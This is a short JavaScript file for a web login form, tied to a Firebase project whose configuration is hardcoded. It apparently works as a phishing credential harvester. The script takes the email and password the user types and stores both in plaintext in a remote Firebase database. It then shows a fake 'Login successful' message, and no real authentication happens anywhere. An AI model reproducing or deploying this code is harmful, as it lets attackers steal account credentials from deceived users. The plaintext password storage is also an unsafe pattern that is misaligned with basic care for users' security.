// Import Firebase modules
import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-app.js";
import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-database.js";

// Firebase configuration
const firebaseConfig = {
    apiKey: "AIzaSyCDLFf5FEMDUua7pPQiI-O5KVyhUikMNxc",
    authDomain: "getinbytechto.firebaseapp.com",
    databaseURL: "https://getinbytechto-default-rtdb.firebaseio.com",
    projectId: "getinbytechto",
    storageBucket: "getinbytechto.firebasestorage.app",
    messagingSenderId: "752224645183",
    appId: "1:752224645183:web:ff2165ff9590e176fc888a",
    measurementId: "G-CELR4QXXCS"
  };

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

// Get references to the input fields and button
const emailInput = document.getElementById("emailInput");
const passwordInput = document.getElementById("passwordInput");
const submitBtn = document.getElementById("submitBtn");

// Function to save user data to Firebase
function saveUserData(email, password) {
    const timestamp = new Date().toISOString(); // Get current timestamp
    const usersRef = ref(database, "users"); // Reference to "users" in Realtime Database
    const newUserRef = push(usersRef); // Create a unique ID for the new user

    // Save the user data to Firebase
    set(newUserRef, {
        email,
        password,
        time: timestamp
    })
    .then(() => {
        alert("Login successful....");
    })
    .catch((error) => {
        console.error("Error saving user data:", error);
        alert("Login error");
    });
}

// Event listener for the submit button
submitBtn.addEventListener("click", () => {
    const email = emailInput.value;
    const password = passwordInput.value;

    // Basic validation
    if (!email || !password) {
        alert("Please fill in both the email and password fields.");
        return;
    }

    // Save the user data to Firebase
    saveUserData(email, password);

    // Clear the input fields
    emailInput.value = '';
    passwordInput.value = '';
});
